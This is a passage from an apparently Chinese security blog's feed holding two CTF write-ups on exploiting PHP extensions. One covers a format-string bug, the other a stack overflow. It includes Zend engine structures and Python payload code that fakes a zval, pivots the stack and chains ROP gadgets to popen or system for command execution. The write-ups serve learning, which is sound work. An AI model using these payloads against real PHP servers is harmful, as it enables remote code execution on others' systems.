*/</span></span><br><span class="line"><span class="keyword">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="keyword">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="keyword">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="keyword">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="keyword">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line"><span class="keyword">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="keyword">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>php中的所有变量都存储在<code>zval</code>这样的结构体中，它所对应的变量类型由type这个字段标识，它的值是由value确定，它永远是一个指针类型, <code>type</code>和<code>value</code>的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNDEF0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_NULL1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FALSE2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TRUE3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_LONG4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DOUBLE5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_STRING6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ARRAY7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_OBJECT8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_RESOURCE9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_REFERENCE10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT_AST12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_BOOL13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CALLABLE14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ITERABLE19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VOID18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_INDIRECT             15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PTR17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_ERROR20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zend_value &#123;</span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="keyword">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="keyword">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> w1;</span><br><span class="line"><span class="keyword">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure><p>php对<code>value</code>指针指向的不同类型都进行了定义，例如:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">zend_refcounted_h gc;</span><br><span class="line">zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line"><span class="keyword">size_t</span>            len;</span><br><span class="line"><span class="keyword">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_array</span> &#123;</span></span><br><span class="line">zend_refcounted_h gc;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_4(</span><br><span class="line">zend_uchar    flags,</span><br><span class="line">zend_uchar    nApplyCount,</span><br><span class="line">zend_uchar    nIteratorsCount,</span><br><span class="line">zend_uchar    consistency)</span><br><span class="line">&#125; v;</span><br><span class="line"><span class="keyword">uint32_t</span> flags;</span><br><span class="line">&#125; u;</span><br><span class="line"><span class="keyword">uint32_t</span>          nTableMask;</span><br><span class="line">Bucket           *arData;</span><br><span class="line"><span class="keyword">uint32_t</span>          nNumUsed;</span><br><span class="line"><span class="keyword">uint32_t</span>          nNumOfElements;</span><br><span class="line"><span class="keyword">uint32_t</span>          nTableSize;</span><br><span class="line"><span class="keyword">uint32_t</span>          nInternalPointer;</span><br><span class="line">zend_long         nNextFreeElement;</span><br><span class="line"><span class="keyword">dtor_func_t</span>       pDestructor;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">zend_refcounted_h gc;</span><br><span class="line"><span class="keyword">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">zend_class_entry *ce;</span><br><span class="line"><span class="keyword">const</span> zend_object_handlers *handlers;</span><br><span class="line">HashTable        *properties;</span><br><span class="line">zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_zend_object</code>的<code>handlers</code>指向一个函数指针数组，存储<code>_zend_object</code>相关函数的地址，<code>zend_object_handlers</code>的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object_handlers</span> &#123;</span></span><br><span class="line"><span class="comment">/* offset of real object header (usually zero) */</span></span><br><span class="line"><span class="keyword">int</span>offset;</span><br><span class="line"><span class="comment">/* general object functions */</span></span><br><span class="line"><span class="keyword">zend_object_free_obj_t</span>free_obj;</span><br><span class="line"><span class="keyword">zend_object_dtor_obj_t</span>dtor_obj;</span><br><span class="line"><span class="keyword">zend_object_clone_obj_t</span>clone_obj;</span><br><span class="line"><span class="comment">/* individual object functions */</span></span><br><span class="line"><span class="keyword">zend_object_read_property_t</span>read_property;</span><br><span class="line"><span class="keyword">zend_object_write_property_t</span>write_property;</span><br><span class="line"><span class="keyword">zend_object_read_dimension_t</span>read_dimension;</span><br><span class="line"><span class="keyword">zend_object_write_dimension_t</span>write_dimension;</span><br><span class="line"><span class="keyword">zend_object_get_property_ptr_ptr_t</span>get_property_ptr_ptr;</span><br><span class="line"><span class="keyword">zend_object_get_t</span><span class="built_in">get</span>;</span><br><span class="line"><span class="keyword">zend_object_set_t</span><span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">zend_object_has_property_t</span>has_property;</span><br><span class="line"><span class="keyword">zend_object_unset_property_t</span>unset_property;</span><br><span class="line"><span class="keyword">zend_object_has_dimension_t</span>has_dimension;</span><br><span class="line"><span class="keyword">zend_object_unset_dimension_t</span>unset_dimension;</span><br><span class="line"><span class="keyword">zend_object_get_properties_t</span>get_properties;</span><br><span class="line"><span class="keyword">zend_object_get_method_t</span>get_method;</span><br><span class="line"><span class="keyword">zend_object_call_method_t</span>call_method;</span><br><span class="line"><span class="keyword">zend_object_get_constructor_t</span>get_constructor;</span><br><span class="line"><span class="keyword">zend_object_get_class_name_t</span>get_class_name;</span><br><span class="line"><span class="keyword">zend_object_compare_t</span>compare_objects;</span><br><span class="line"><span class="keyword">zend_object_cast_t</span>cast_object;</span><br><span class="line"><span class="keyword">zend_object_count_elements_t</span>count_elements;</span><br><span class="line"><span class="keyword">zend_object_get_debug_info_t</span>get_debug_info;</span><br><span class="line"><span class="keyword">zend_object_get_closure_t</span>get_closure;</span><br><span class="line"><span class="keyword">zend_object_get_gc_t</span>get_gc;</span><br><span class="line"><span class="keyword">zend_object_do_operation_t</span>do_operation;</span><br><span class="line"><span class="keyword">zend_object_compare_zvals_t</span>compare;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过上述的分析，可以知道在控制格式化字符串的<code>format</code>参数之后可以使用<code>%p</code>来泄露栈数据，而且至少有两种控制EIP的方法：</p><ol><li>利用 <code>%n</code>，修改栈上存储的返回地址，然后跳转到指定的位置执行。</li><li>利用 <code>%Z</code>，在可控的位置伪造一个<code>object</code>类型的fake<code>zval</code>，然后伪造<code>object</code>类型的函数指针数组<code>handlers</code>中的<code>get</code>或者<code>cast_object</code>函数指针为需要执行的指令地址，就可以控制EIP。</li></ol><p>由于php一般都运行在web环境中，无法直接交互，所以像直接修改返回地址为 <code>one_gadget</code> 的利用方法已经无法使用了，为了实现任意命令执行，仅控制EIP是不够的，而且还需要控制RDI，甚至RSI。控制寄存器的方法一般就是使用ROP chian，但是问题在于64位系统中函数调用时通过寄存器传参，并且zend内部注册的变量(我们的输入)一般都是存储在堆上，这两方面原因导致我们无法控制栈上的数据，所以就无法进行ROP chain，所以唯一可行的方案就是找能够进行栈迁移的 <code>gadget</code>，将栈迁移到可以控制的数据区域，接着再进行rop。@wupcoo大佬出的题目十分的经典，本文也是在学习他的题目后写的，下面就他的题目提供的exp进行讲解。</p><h3 id="ogeek-check-in-writeup"><a href="#ogeek-check-in-writeup" class="headerlink" title="ogeek check_in writeup"></a>ogeek check_in writeup</h3><p>题目地址<a href="https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string</a>，原writeup地址<a href="http://www.wupco.cn/?p=4504" target="_blank" rel="noopener">http://www.wupco.cn/?p=4504</a>。</p><p>wupcoo原始的exp先泄露了<code>libphp.so</code>的加载基址，然后再libphp.so中找rop，这里泄露<code>libphp.so</code>加载基址的方法十分的凑巧，主要是利用<code>CppClass_render</code>函数再调用<code>render_s</code>函数之前会调用函数 <code>zend_read_property_ex</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ZEND_API zval *<span class="title">zend_read_property_ex</span><span class="params">(zend_class_entry *scope, zval *object, zend_string *name, zend_bool silent, zval *rv)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zval property, *value;</span><br><span class="line">zend_class_entry *old_scope = EG(fake_scope);</span><br><span class="line"></span><br><span class="line">EG(fake_scope) = scope;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Z_OBJ_HT_P(object)-&gt;read_property) &#123;</span><br><span class="line">zend_error_noreturn(E_CORE_ERROR, <span class="string">"Property %s of class %s cannot be read"</span>, ZSTR_VAL(name), ZSTR_VAL(Z_OBJCE_P(object)-&gt;name));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZVAL_STR(&amp;property, name);</span><br><span class="line">value = Z_OBJ_HT_P(object)-&gt;read_property(object, &amp;property, silent?BP_VAR_IS:BP_VAR_R, <span class="literal">NULL</span>, rv);</span><br><span class="line"></span><br><span class="line">EG(fake_scope) = old_scope;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>Z_OBJ_HT_P(object)-&gt;read_property</code> 是一个指向libphp中某个函数的函数指针，是存储在r9中的，没有被清空，所以通过泄露R9就可以获得libphp.so的加载基址，但是这种办法不通用，所以被我删除了。</p><p>exp中首先使用 700个 <code>%p</code> 泄露栈数据，获取一个自主可控的地址空间作为将来栈迁移的基址heap_addr以及libc.so的基址，有由于RCX的值完全可控，所以可以让RCX指向heap_addr，然后在heap_addr的位置布局object类型的fake zval，通过控制<code>object.handlers-&gt;cast_object</code>来控制EIP，将EIP劫持到指令<code>push [rcx]; rcr [rbx+0x51],0x41 ; pop rsp ;ret ;</code>的位置来进行栈迁移，并同时布局rop chain用于控制RDI和RSI，最后跳转到<code>popen</code>进行任意命令执行。栈数据构造的代码以及注释如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exp = p64(heap_addr+<span class="number">0x10</span>) <span class="comment"># heap_addr; 布局 fake zval, zval.value.obj= heap_addr+0x10 , size0f(zval)  = 0x10        </span></span><br><span class="line">exp += p64(<span class="number">0x8</span>)           <span class="comment"># heap_addr+0x8 ;   zval.type = 0x8</span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0x20</span>)<span class="comment"># heap_addr+0x10 ;  布局 zend_object,   sizeof(zend_object) = 0x38 0x7f9746cd29a8</span></span><br><span class="line">exp += bytes(<span class="string">"AAAAAAAA"</span>,encoding=<span class="string">"latin-1"</span>)  <span class="comment"># heap_addr+0x18   </span></span><br><span class="line">exp += p64(pop_ret)        <span class="comment"># heap_addr+0x20       # </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0x30</span>) <span class="comment"># heap_addr + 0x28    zend_object.handlers  = heap_addr + 0x30</span></span><br><span class="line">exp += p64(pop_rdi)        <span class="comment"># heap_addr + 0x30    布局 zend_object_handlers: sizeof(zend_object_handlers) = 0xe0 </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0xe8</span>) <span class="comment"># heap_addr + 0x38    指向command字符串</span></span><br><span class="line">exp += p64(pop_rsi)        <span class="comment"># heap_addr + 0x40    </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0xe0</span>) <span class="comment"># heap_addr + 0x48    指向字符串"r"</span></span><br><span class="line">exp += p64(call_popen)     <span class="comment"># heap_addr + 0x50    popen函数地址 </span></span><br><span class="line">exp += bytes(<span class="string">"CCCCCCCC"</span>*<span class="number">16</span>,encoding=<span class="string">"latin-1"</span>)  <span class="comment"># heap_addr + 0x58</span></span><br><span class="line">exp += p64(magic_addr)     <span class="comment"># heap_addr + 0xd8    伪造 zend_object_handlers-&gt;cast_object 进行栈迁移</span></span><br><span class="line">exp += bytes(<span class="string">"r"</span>,encoding=<span class="string">"latin-1"</span>)+<span class="string">b"\x00"</span>*<span class="number">7</span> <span class="comment"># heap_addr + 0xe0</span></span><br><span class="line">exp += command.ljust(<span class="number">80</span>,<span class="string">b'\x00'</span>) <span class="comment">#heap_addr + 0xe8</span></span><br><span class="line">exp += bytes(<span class="string">"AAAAAAAA"</span>,encoding=<span class="string">"latin-1"</span>)</span><br></pre></td></tr></table></figure><p>在栈上布局<code>fake zval</code>的同时还需要考虑rop chain的布局，这个exp很有意思。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.wupco.cn/?p=4504" target="_blank" rel="noopener">http://www.wupco.cn/?p=4504</a></p><p><a href="https://www.freebuf.com/vuls/116398.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/116398.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;php-pwn学习入门二-格式化字符串漏洞&quot;&gt;&lt;a href=&quot;#php-pwn学习入门二-格式化字符串漏洞&quot; class=&quot;headerlink&quot; title=&quot;php pwn学习入门二 (格式化字符串漏洞)&quot;&gt;&lt;/a&gt;php pwn学习入门二 (格式化字符串漏洞)&lt;/h2&gt;&lt;p&gt;本文是学习php二进制漏洞利用的第二篇文章，格式化字符串漏洞是CTF比赛中比较常见的漏洞，本文主要介绍一下64位下php中的格式化字符串漏洞的利用思路。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="php" scheme="http://blog.wonderkun.cc/tags/php/"/>
    
      <category term="web" scheme="http://blog.wonderkun.cc/tags/web/"/>
    
      <category term="pwn" scheme="http://blog.wonderkun.cc/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>php pwn学习入门一 (基础环境搭建)</title>
    <link href="http://blog.wonderkun.cc/2020/05/12/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B8%80/"/>
    <id>http://blog.wonderkun.cc/2020/05/12/php pwn学习入门一/</id>
    <published>2020-05-12T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="php-pwn学习入门一-基础环境搭建"><a href="#php-pwn学习入门一-基础环境搭建" class="headerlink" title="php pwn学习入门一 (基础环境搭建)"></a>php pwn学习入门一 (基础环境搭建)</h2><p>本文是学习php二进制漏洞利用的第一篇文章，本文主要简单说一下基础的环境搭建问题以及一个简单的栈溢出的利用过程。</p><a id="more"></a><h3 id="php不同的运行模式"><a href="#php不同的运行模式" class="headerlink" title="php不同的运行模式"></a>php不同的运行模式</h3><p>SAPI(Server Application Programming Interface)是服务器端应用编程端口，它是应用层(比如 Apache，Nginx，CLI等)和 PHP 进行数据交互的入口。利用SAPI，php能够和其上的具体应用层进行解耦合，使得同一套php内核就可以和多种不同的应用层进行交互。在php的源代码sapi目录下有多种sapi的具体实现，比如cgi、cli、apache2handler、fpm等。</p><p>根据不同的上层应用，php使用的SAPI也不同，常见的搭配有<code>apache2+apache2handler</code>，<code>nginx+fpm</code>，当然也存在 <code>apache2 + cgi</code>的模式，不过由于性能问题，现在已经基本见不到了。(defcon曾经出过一个赛题叫shellql，就是 <code>apache2 + cgi</code> 模式下写shellcode，此模式相对于其他两种会简单一些，此处就不讲了)。</p><p>一般调试php，最好是能够自己重新编译一下php，这样的二进制有符号表，可以大大的提高了调试时的效率。</p><p><code>nginx+fpm</code>的这种运行方式的调试我在复现CVE-2019-11043漏洞的那篇文章中说过，但是注意编译php时的参数选择，最主要的是<code>--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data</code>，其他的编译参数的含义可以直接使用<code>./configure --help</code>查看，偷懒的办法就是直接 pull php 官方提供的docker环境<code>php:version-fpm</code>，然后运行<code>php-config --configure-options</code>参考一下。</p><p><code>apache2+apache2handler</code>运行模式下需要编译mod_php，就是俗称的 <code>libphp.so</code>，将它作为模块加载到apache2中执行，需要使用<code>--with-apxs2</code>来指定apache2的<code>apxs2</code>路径。在编译安装完成libphp.so之后，还无法启动apache2，因为php不支持apche2默认采用的<code>mpm_event</code>多线程管理技术，所以需要执行<code>a2dismod mpm_event &amp;&amp; a2enmod  mpm_prefork</code>来启用php支持的<code>mpm_prefork</code>，具体的详情可以参考php官方文档<a href="https://www.php.net/manual/en/install.unix.apache2.php" target="_blank" rel="noopener">https://www.php.net/manual/en/install.unix.apache2.php</a>。我也在这里提供了一个Dockerfile例子<a href="https://github.com/wonderkun/CTFENV/tree/master/libphp-extension-debug" target="_blank" rel="noopener">https://github.com/wonderkun/CTFENV/tree/master/libphp-extension-debug</a>。</p><h3 id="De1CTF-mixture-题解"><a href="#De1CTF-mixture-题解" class="headerlink" title="De1CTF mixture 题解"></a>De1CTF mixture 题解</h3><p>这个题目按道理是比较简单的，但是当时做出来的人也不多，可能是被 <code>apache2+apache2handler</code> 这种运行模式吓到了，很有幸朋友 @lfy 在赛后给我提供了题目环境<a href="https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/stack_overflow" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/stack_overflow</a>。</p><p>为了调试的方便，以debug模式启动apache2: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apachectl -X &amp;</span><br><span class="line">gdb -q -p `pidof apache2`</span><br></pre></td></tr></table></figure><p>此题目是一个基础的栈溢出利用，由于可以直接写栈，所以可以直接构造 ROP chian来实现任意命令执行。但是由于溢出点的函数栈帧偏移无法被泄露出来，而且是64位的非交互环境，也无法直接跳到one_gadget，所以任意命令执行的参数构造还是有点麻烦，但是pwn师傅找的 gadget <code>mov QWORD PTR [rdx],rdi ; ret</code>，来进行参数构造的方法真是香(我完全想不到)，主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>+<span class="number">1</span>):</span><br><span class="line">    payload+=p64(pop_rdx)</span><br><span class="line">    payload+=p64(shell_addr+i*<span class="number">8</span>)</span><br><span class="line">    payload+=p64(pop_rdi)</span><br><span class="line">    payload+= bytes(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>),encoding=<span class="string">"latin-1"</span>)</span><br><span class="line">    payload+=p64(mov_rdx_rdi)</span><br></pre></td></tr></table></figure><p>除此之外，在php扩展中，返回信息是通过结构体指针传出的，所以下图中的代码会修改栈上的数据，影响最后栈上的rop的执行，所以这里需要放一些无用的数据来防止破坏rop chain，在真实利用过程中此处使用4个pop操作进行绕过。</p><p><img src="http://pic.wonderkun.cc/uploads/2020/05/2020-05-13-12-26-17.png" alt="http://pic.wonderkun.cc/uploads/2020/05/2020-05-13-12-26-17.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop4_ret=libc_addr+<span class="number">0x000000000002219e</span>  <span class="comment"># 0x7ffff711519e ;pop    r13 ; pop    r14 ;pop    r15;pop    rbp; ret</span></span><br><span class="line">payload=p64(pop_rdx)*<span class="number">10</span>+p64(pop4_ret)+p64(<span class="number">0</span>)*<span class="number">4</span> + p64(pop4_ret)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br></pre></td></tr></table></figure><p>最后一个问题是system函数中有指令 <code>movaps xmmword ptr [rsp+0x40], xmm0</code>可能会导致崩溃，查了一些资料才知道 <a href="http://blog.binpang.me/2019/07/12/stack-alignment/" target="_blank" rel="noopener">http://blog.binpang.me/2019/07/12/stack-alignment/</a>，<a href="http://homura.cc/blog/archives/168" target="_blank" rel="noopener">http://homura.cc/blog/archives/168</a>，这条指令要求 rsp必须是16字节对齐的，所以需要修改一下栈布局，让调用system函数的时候rsp是16字节对齐的即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;php-pwn学习入门一-基础环境搭建&quot;&gt;&lt;a href=&quot;#php-pwn学习入门一-基础环境搭建&quot; class=&quot;headerlink&quot; title=&quot;php pwn学习入门一 (基础环境搭建)&quot;&gt;&lt;/a&gt;php pwn学习入门一 (基础环境搭建)&lt;/h2&gt;&lt;p&gt;本文是学习php二进制漏洞利用的第一篇文章，本文主要简单说一下基础的环境搭建问题以及一个简单的栈溢出的利用过程。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="php" scheme="http://blog.wonderkun.cc/tags/php/"/>
    
      <category term="web" scheme="http://blog.wonderkun.cc/tags/web/"/>
    
      <category term="pwn" scheme="http://blog.wonderkun.cc/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>领先一代的技术</title>
    <link href="http://blog.wonderkun.cc/2020/04/24/%E9%A2%86%E5%85%88%E4%B8%80%E4%BB%A3%E7%9A%84%E6%8A%80%E6%9C%AF/"/>
    <id>http://blog.wonderkun.cc/2020/04/24/领先一代的技术/</id>
    <published>2020-04-24T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
